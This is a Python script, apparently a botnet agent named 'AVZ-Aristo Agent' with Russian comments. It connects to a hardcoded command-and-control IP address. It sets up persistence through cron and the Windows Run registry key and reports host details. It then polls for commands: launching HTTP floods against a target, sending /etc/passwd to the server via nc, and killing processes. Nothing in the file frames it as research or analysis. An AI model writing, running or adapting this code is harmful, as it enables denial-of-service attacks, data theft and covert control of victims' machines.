#!/usr/bin/env python3
# AVZ-Aristo Agent v26.6 – автозагрузка, XOR, регулярный ping
import socket, json, time, os, platform, subprocess, threading, random, base64

C2_HOST = "80.249.146.202"
C2_PORT = 80
XOR_KEY = random.randint(1, 255)

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data.encode()]) if isinstance(data, str) else bytes([b ^ key for b in data])

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def get_info():
    return {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
        "ram": "unknown"
    }

def auto_start():
    """Добавляет агент в автозагрузку."""
    try:
        if platform.system() == 'Linux':
            cron_line = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)} &\n"
            with open("/tmp/agent_cron", "w") as f:
                f.write(cron_line)
            subprocess.run("crontab /tmp/agent_cron", shell=True)
        elif platform.system() == 'Windows':
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "AVZ Agent", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
    except:
        pass

def register():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        # Отправляем XOR_KEY вместе с регистрацией
        s.sendall(json.dumps({**get_info(), "xor_key": XOR_KEY}).encode())
        s.close()
    except:
        pass

def get_commands():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(xor_encrypt("ping", XOR_KEY))
        data = s.recv(4096)
        s.close()
        if data and data != b"no commands":
            return json.loads(xor_decrypt(data, XOR_KEY).decode())
    except:
        pass
    return []

def main():
    auto_start()
    register()
    while True:
        cmds = get_commands()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                target = cmd.get("target")
                threads = int(cmd.get("threads", 10))
                def flood():
                    import requests
                    for _ in range(threads):
                        try:
                            requests.get(target, timeout=2)
                        except:
                            pass
                threading.Thread(target=flood, daemon=True).start()
            elif cmd.get("type") == "grab":
                os.system("cat /etc/passwd | nc {} {}".format(C2_HOST, C2_PORT))
            elif cmd.get("type") == "stop":
                os.system("pkill wget; pkill python3")
        time.sleep(15)

if __name__ == "__main__":
    main()
